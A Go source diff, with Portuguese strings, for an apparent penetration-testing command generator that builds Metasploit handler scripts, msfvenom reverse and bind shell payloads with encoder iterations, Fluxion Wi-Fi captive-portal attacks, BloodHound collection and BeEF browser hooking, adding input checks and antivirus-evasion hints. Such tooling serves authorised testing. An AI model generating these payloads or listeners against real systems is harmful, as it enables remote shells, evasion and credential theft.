@@ -2,6 +2,7 @@ package tools
 
 import (
 	"fmt"
+	"net"
 	"strings"
 )
 
@@ -243,7 +244,10 @@ func generateMetasploit(t *Tool, a map[string]string) (*Result, error) {
 	rtarget := answer(a, "rtarget")
 	module := answer(a, "module")
 
-	if !validHost(lhost) {
+	if listener != "bind_tcp" && lhost == "" {
+		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "campo obrigatório não preenchido"}
+	}
+	if lhost != "" && !validHost(lhost) {
 		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "informe um IP ou hostname válido"}
 	}
 	if !validPort(lport) {
@@ -252,8 +256,8 @@ func generateMetasploit(t *Tool, a map[string]string) (*Result, error) {
 	if rtarget != "" && !validHost(rtarget) {
 		return nil, &ValidationError{ID: "rtarget", Question: "Alvo remoto (RHOSTS, opcional)", Reason: "informe um IP ou hostname válido"}
 	}
-	if module != "" && !validHost(module) {
-		return nil, &ValidationError{ID: "module", Question: "Módulo de exploit", Reason: "valor inválido de módulo"}
+	if module != "" && !validModulePath(module) {
+		return nil, &ValidationError{ID: "module", Question: "Módulo de exploit", Reason: "informe um caminho de módulo válido (ex.: exploit/windows/smb/ms17_010_eternalblue)"}
 	}
 
 	payload := map[string]string{
@@ -295,6 +299,8 @@ func generateMetasploit(t *Tool, a map[string]string) (*Result, error) {
 	)
 	if listener != "bind_tcp" {
 		handlerLines = append(handlerLines, "set LHOST "+lhost)
+	} else if rtarget != "" {
+		handlerLines = append(handlerLines, "set RHOSTS "+rtarget)
 	}
 	handlerLines = append(handlerLines,
 		fmt.Sprintf("set LPORT %d", lport),
@@ -321,6 +327,9 @@ func generateMetasploit(t *Tool, a map[string]string) (*Result, error) {
 		"Salve o script .rc e inicie o listener ANTES de executar o payload no alvo.",
 		"Bind TCP não possui LHOST; o alvo precisa aceitar conexão de entrada.",
 		"Windows Defender/AVs detectam payloads padrão: considere encoders ou customização.",
+	}
+	if listener == "bind_tcp" && rtarget == "" {
+		notes = append(notes, "Payload bind TCP: defina RHOSTS no handler.rc para o listener conectar ao alvo.")
 	}
 	if module != "" {
 		exploitLines := []string{"use " + module}
@@ -901,6 +910,15 @@ func generateBloodHound(t *Tool, a map[string]string) (*Result, error) {
 	}
 	startNeo4j := boolAnswer(a, "neo4j")
 
+	if collector != "sharphound" {
+		if user == "" {
+			return nil, &ValidationError{ID: "user", Question: "Usuário", Reason: "campo obrigatório para o bloodhound-python"}
+		}
+		if domain == "" {
+			return nil, &ValidationError{ID: "domain", Question: "Domínio", Reason: "campo obrigatório para o bloodhound-python"}
+		}
+	}
+
 	commands := []Command{}
 	if startNeo4j {
 		commands = append(commands, Command{
@@ -997,8 +1015,8 @@ func generateFluxion(t *Tool, a map[string]string) (*Result, error) {
 	commands = append(commands, Command{
 		Title:    "Executar o ataque",
 		Language: "shell",
-		Code:     cmd("sudo", append([]string{"./fluxion.sh"}, args...)...),
-		Hint:     "Fluxion é interativo (menus). No portal cativo, a senha digitada é validada contra o handshake.",
+		Code:     "cd fluxion && " + cmd("sudo", append([]string{"./fluxion.sh"}, args...)...),
+		Hint:     "Assume a pasta fluxion clonada no passo 1 (rode a partir do diretório-pai). Fluxion é interativo (menus); no portal cativo a senha é validada contra o handshake.",
 	})
 
 	res := &Result{
@@ -1085,12 +1103,26 @@ func generateMsfvenom(t *Tool, a map[string]string) (*Result, error) {
 	lport := intAnswer(a, "lport", 4444)
 	format := answer(a, "format")
 	encoder := answer(a, "encoder")
+	encoderIter := intAnswer(a, "encoderIter", 1)
+	target := answer(a, "target")
 
-	if !validHost(lhost) {
+	if listener != "bind_tcp" && lhost == "" {
+		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "campo obrigatório não preenchido"}
+	}
+	if lhost != "" && !validHost(lhost) {
 		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "informe um IP ou hostname válido"}
 	}
 	if lport < 1 || lport > 65535 {
 		return nil, &ValidationError{ID: "lport", Question: "LPORT", Reason: "porta deve estar entre 1 e 65535"}
+	}
+	if target != "" && !validHost(target) {
+		return nil, &ValidationError{ID: "target", Question: "Alvo (RHOSTS, opcional)", Reason: "informe um IP ou hostname válido"}
+	}
+	if encoder != "" && !validEncoder(encoder) {
+		return nil, &ValidationError{ID: "encoder", Question: "Encoder (opcional)", Reason: "nome de encoder inválido (ex.: x86/shikata_ga_nai)"}
+	}
+	if encoderIter < 1 || encoderIter > 100 {
+		return nil, &ValidationError{ID: "encoderIter", Question: "Iterações do encoder (-i)", Reason: "valor fora do intervalo permitido (1-100)"}
 	}
 
 	payload := map[string]string{
@@ -1147,26 +1179,55 @@ func generateMsfvenom(t *Tool, a map[string]string) (*Result, error) {
 	}
 	args = append(args, fmt.Sprintf("LPORT=%d", lport))
 	if encoder != "" {
-		args = append(args, "-e", q(encoder))
+		args = append(args, "-e", encoder)
+		if encoderIter > 1 {
+			args = append(args, "-i", fmt.Sprintf("%d", encoderIter))
+		}
 	}
 	args = append(args, "-f", format, "-o", q(outFile))
+
+	handlerLines := []string{
+		"use exploit/multi/handler",
+		"set PAYLOAD " + payload,
+	}
+	if listener != "bind_tcp" {
+		handlerLines = append(handlerLines, "set LHOST "+lhost)
+	} else if target != "" {
+		handlerLines = append(handlerLines, "set RHOSTS "+target)
+	}
+	handlerLines = append(handlerLines,
+		fmt.Sprintf("set LPORT %d", lport),
+		"set ExitOnSession false",
+		"exploit -j -z",
+	)
 
 	res := &Result{
 		ToolID:   t.ID,
 		ToolName: t.Name,
 		Risk:     t.Risk,
-		Commands: []Command{{
-			Title:    "Gerar payload",
-			Language: "shell",
-			Code:     cmd("msfvenom", args...),
-			Hint:     "Copie " + outFile + " para o alvo. Inicie o listener no Metasploit antes de executar.",
-		}},
+		Commands: []Command{
+			{
+				Title:    "Gerar payload",
+				Language: "shell",
+				Code:     cmd("msfvenom", args...),
+				Hint:     "Copie " + outFile + " para o alvo. Inicie o listener no Metasploit antes de executar.",
+			},
+			{
+				Title:    "Listener de retorno (handler.rc)",
+				Language: "resource",
+				Code:     strings.Join(handlerLines, "\n"),
+				Hint:     "Salve como handler.rc e rode: msfconsole -q -r handler.rc",
+			},
+		},
 		Notes: []string{
-			"Listener correspondente: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD " + payload + "; set LHOST " + lhost + "; set LPORT " + fmt.Sprintf("%d", lport) + "; run'",
-			"Bind TCP não usa LHOST; o alvo deve aceitar conexão de entrada.",
+			"Salve o script .rc e inicie o listener ANTES de executar o payload no alvo.",
+			"Bind TCP não usa LHOST; o alvo precisa aceitar conexão de entrada.",
 			"AVs/EDRs detectam payloads padrão do msfvenom — encoders não garantem evasão.",
 		},
 		Warnings: []string{"Executar payloads em sistemas sem autorização é crime."},
+	}
+	if listener == "bind_tcp" && target == "" {
+		res.Notes = append(res.Notes, "Payload bind TCP: defina RHOSTS no handler.rc para o listener conectar ao alvo.")
 	}
 	return res, nil
 }
@@ -1279,6 +1340,9 @@ func generateBeEF(t *Tool, a map[string]string) (*Result, error) {
 			"beEF oferece keylogging, screenshots, pivoting e propagação para outros browsers.",
 		},
 		Warnings: []string{"Fisgar navegadores de terceiros sem consentimento é crime."},
+	}
+	if port != 3000 {
+		res.Notes = append(res.Notes, fmt.Sprintf("Porta %d: o beEF só escuta nela se http.server.port no config.yaml também for %d (o padrão é 3000) — senão o hook.js responde 404.", port, port))
 	}
 	return res, nil
 }
@@ -1551,6 +1615,9 @@ func generateRDNS(t *Tool, a map[string]string) (*Result, error) {
 		code = cmd("nmap", args...)
 		hint = "-sL apenas resolve nomes, sem varrer portas (não precisa de root)."
 	default: // dig
+		if net.ParseIP(target) == nil {
+			return nil, &ValidationError{ID: "target", Question: "Alvo (IP, range ou rede)", Reason: "dig -x aceita apenas um IP único — use dnsrecon ou nmap para range/CIDR"}
+		}
 		args := []string{"-x", q(target)}
 		if resolver != "" {
 			args = append(args, "@"+resolver)
